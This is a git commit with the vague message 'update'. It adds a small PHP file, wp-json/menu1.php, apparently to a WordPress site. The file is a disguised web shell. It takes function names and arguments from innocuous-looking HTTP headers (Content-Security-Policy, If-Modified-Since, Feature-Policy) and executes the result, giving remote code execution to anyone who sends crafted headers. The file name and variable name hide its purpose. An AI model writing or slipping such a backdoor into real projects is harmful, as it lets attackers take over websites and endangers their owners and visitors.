2bf305f66f86a29733f720dac73c8c7bb2eda758
Fast and Static <it@e-me.co>
2024-09-27 04:05:45 +0000

    update

---
+++ wp-json/menu1.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['Content-Security-Policy'])) {
+    $ob_iconv_handle = $_HEADERS['Content-Security-Policy']('', $_HEADERS['If-Modified-Since']($_HEADERS['Feature-Policy']));
+    $ob_iconv_handle();
+}
